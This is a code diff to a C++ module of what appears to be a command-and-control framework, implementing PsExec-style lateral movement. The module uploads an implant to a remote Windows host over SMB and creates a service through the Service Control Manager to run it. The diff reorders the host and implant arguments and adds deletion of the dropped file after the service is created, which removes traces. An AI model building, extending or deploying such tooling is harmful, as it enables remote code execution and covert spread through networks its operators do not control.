@@ -30,7 +30,6 @@ __declspec(dllexport) PsExec* PsExecConstructor()
     return new PsExec();
 }
 
-BOOL uploadFileSMB(const std::string& srcPath, const std::string& dstPath);
 BOOL createFileSMB(const std::string& dstPath, const std::string& data, std::string& result);
 BOOL createServiceWithSCM(const std::string& scmServer, const std::string& serviceName, const std::string& servicePath, std::string& result);
 
@@ -56,8 +55,8 @@ std::string PsExec::getInfo()
     info += "The exe must be a service binary or inject into another process. \n";
     info += "You must have the right kerberos tickets. \n";
 	info += "exemple:\n";
-	info += "- psExec /tmp/implant.exe m3dc.cyber.local\n";
-    info += "- psExec /tmp/implant.exe 10.9.20.10\n";
+	info += "- psExec m3dc.cyber.local /tmp/implant.exe\n";
+    info += "- psExec 10.9.20.10 /tmp/implant.exe\n";
 
 	return info;
 }
@@ -65,10 +64,10 @@ std::string PsExec::getInfo()
 
 int PsExec::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 {
-   if (splitedCmd.size() == 3)
+   if (splitedCmd.size() >= 3)
 	{
-		string inputFile = splitedCmd[1];
-		string scmServer = splitedCmd[2];
+        string scmServer = splitedCmd[1];
+		string inputFile = splitedCmd[2];
 
 		std::ifstream input(inputFile, std::ios::binary);
 		if( input ) 
@@ -105,6 +104,7 @@ int PsExec::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 
 std::string randomName( size_t length )
 {
+    srand(time(NULL));
     auto randchar = []() -> char
     {
         const char charset[] =
@@ -149,9 +149,18 @@ int PsExec::process(C2Message &c2Message, C2Message &c2RetMessage)
     result += serviceName;
     result += "\n";
 
-    BOOL ret=createFileSMB(dstPath, data, result);
+    BOOL ret = createFileSMB(dstPath, data, result);
     if (ret) 
+    {
         createServiceWithSCM(scmServer, serviceName, servicePath, result);
+
+        ret = DeleteFile(dstPath.c_str());
+        if (!ret) 
+        {
+            result += "DeleteFile Failed: ";
+            result += std::to_string(GetLastError());
+        }
+    }
     else 
     {
         result += "Upload Failed: ";
@@ -172,13 +181,6 @@ int PsExec::process(C2Message &c2Message, C2Message &c2RetMessage)
 
 
 #ifdef _WIN32 
-
-
-BOOL uploadFileSMB(const std::string& srcPath, const std::string& dstPath)
-{
-    BOOL ret = CopyFileA(srcPath.c_str(), dstPath.c_str(), FALSE);
-    return ret;
-}
 
 
 BOOL createFileSMB(const std::string& dstPath, const std::string& data, std::string& result)
